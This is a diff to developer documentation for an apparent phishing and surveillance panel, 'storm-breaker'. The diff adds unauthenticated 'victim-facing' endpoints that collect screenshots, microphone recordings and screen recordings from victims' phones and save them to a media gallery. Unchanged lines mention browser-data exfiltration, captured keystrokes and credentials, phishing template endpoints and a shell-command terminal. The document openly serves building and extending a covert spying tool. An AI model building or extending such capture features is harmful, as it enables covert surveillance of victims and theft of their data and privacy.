@@ -391,7 +391,7 @@ The file is parsed by `load_php_config()` in `app.py` which uses regex: `r'"([^\
 ### Auth Check in Routes
 - Panel routes check `session.get('IAm-logined')` and redirect to login if missing
 - Most API routes check `session.get('IAm-logined')` and return `401 Unauthorized` if missing
-- Victim-facing endpoints (`/api/mobile/register`, `/api/fingerprint`, `/api/browser-exfil/receive`, `/api/network/receive`, `/t/<name>/post`, etc.) have **no auth** — they must be accessible by victims
+- Victim-facing endpoints (`/api/mobile/register`, `/api/mobile/screenshot`, `/api/mobile/audio`, `/api/mobile/screen_record`, `/api/fingerprint`, `/api/browser-exfil/receive`, `/api/network/receive`, `/t/<name>/post`, etc.) have **no auth** — they must be accessible by victims
 - The terminal endpoint (`POST /api/terminal`) requires auth and executes commands via `subprocess.run()`
 
 ---
@@ -512,6 +512,16 @@ The panel (`GET /panel`) renders `flask_templates/panel.html` — a single-page 
   - `GET /api/mobile/get_response/<uid>` — pops oldest response
   - `POST /api/mobile/background_data` — `{uid, data}` → stores tracking data (max 100/device)
   - `GET /api/mobile/tracking_data/<uid>` — returns all tracking data for device
+  - `POST /api/mobile/screenshot` — `{uid, image, url, timestamp}` → saves base64 image to `images/`
+  - `POST /api/mobile/audio` — `{uid, audio, timestamp}` → saves base64 recording to `sounds/`
+  - `POST /api/mobile/screen_record` — `{uid, video, timestamp}` → saves base64 recording to `videos/`
+  - `GET /api/mobile/captures?uid=<uid>` → lists captured media (newest first) from the `mobile_captures` table
+- **Media captures** — screenshots, microphone recordings and screen recordings are written to disk
+  (`images/`, `sounds/`, `videos/`) and indexed in the `mobile_captures` SQLite table, so they survive a
+  server restart. The Mobile tab renders them in a **Captured Media** gallery.
+- **Captured media is served from** `/images/<file>`, `/sounds/<file>` and `/videos/<file>`
+- The three capture endpoints are victim-facing, so they are listed in the auth-gate allowlist
+  (see [Security Notes](#security-notes))
 
 ### 9. Analytics
 **Tab ID:** `analytics` | **JS:** `advanced_dashboard.js`
@@ -1571,7 +1581,7 @@ Full Telegram bot (`telegram_bot.py`, 374 lines) with:
 - **Default credentials:** `admin:admin` — change in `config.php` immediately
 - **Flask secret key:** Hardcoded as `'storm-breaker-secret-key-v1'` — change in `app.py` for production
 - **No HTTPS:** Flask dev server has no TLS — use nginx/caddy reverse proxy with SSL
-- **No auth on victim endpoints:** `/api/mobile/register`, `/api/fingerprint`, `/api/browser-exfil/receive`, `/api/network/receive`, `/t/<name>/post` — by design (victims must access these)
+- **No auth on victim endpoints:** `/api/mobile/register`, `/api/mobile/screenshot`, `/api/mobile/audio`, `/api/mobile/screen_record`, `/api/fingerprint`, `/api/browser-exfil/receive`, `/api/network/receive`, `/t/<name>/post` — by design (victims must access these)
 - **Terminal command execution:** `POST /api/terminal` executes arbitrary OS commands with `shell=True` — auth required but still powerful
 - **No upload size limit:** `app.config['MAX_CONTENT_LENGTH'] = None` — can receive unlimited file sizes
 - **Plaintext storage:** All credentials, keystrokes, and captured data stored unencrypted on disk and in SQLite
